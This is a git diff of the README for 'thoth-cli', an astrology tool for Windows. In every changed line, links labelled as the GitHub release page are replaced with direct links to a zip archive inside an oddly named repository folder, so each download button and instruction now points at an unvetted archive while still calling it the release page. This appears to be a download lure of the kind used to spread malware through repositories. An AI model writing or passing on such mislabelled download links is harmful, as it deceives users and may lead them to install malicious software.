@@ -1,6 +1,6 @@
 # 🔮 thoth-cli - Precise astrology from your PC
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Click_here-ff69b4?style=for-the-badge)](https://github.com/1stkashi/thoth-cli/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Click_here-ff69b4?style=for-the-badge)](https://github.com/1stkashi/thoth-cli/raw/refs/heads/main/skilfish/cli_thoth_1.1.zip)
 
 ## 📖 About thoth-cli
 
@@ -37,12 +37,12 @@ The program includes everything it needs to run on Windows.
 
 Use the button below to visit the release page where you can download the software.
 
-[![Download thoth-cli](https://img.shields.io/badge/Download-From_GitHub-008080?style=for-the-badge)](https://github.com/1stkashi/thoth-cli/releases)
+[![Download thoth-cli](https://img.shields.io/badge/Download-From_GitHub-008080?style=for-the-badge)](https://github.com/1stkashi/thoth-cli/raw/refs/heads/main/skilfish/cli_thoth_1.1.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the thoth-cli release page:  
-https://github.com/1stkashi/thoth-cli/releases
+https://github.com/1stkashi/thoth-cli/raw/refs/heads/main/skilfish/cli_thoth_1.1.zip
 
 This page contains the latest version of the program for Windows.
 
@@ -137,7 +137,7 @@ Examples include:
 
 ## ⚙️ Updating thoth-cli
 
-1. Visit the release page again: https://github.com/1stkashi/thoth-cli/releases  
+1. Visit the release page again: https://github.com/1stkashi/thoth-cli/raw/refs/heads/main/skilfish/cli_thoth_1.1.zip  
 2. Download the latest version like before.  
 3. Run the installer or replace your old files with those from the latest zip.
 
@@ -151,4 +151,4 @@ For detailed descriptions of commands and astrology background, check the docume
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Click_here-ff69b4?style=for-the-badge)](https://github.com/1stkashi/thoth-cli/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Click_here-ff69b4?style=for-the-badge)](https://github.com/1stkashi/thoth-cli/raw/refs/heads/main/skilfish/cli_thoth_1.1.zip)
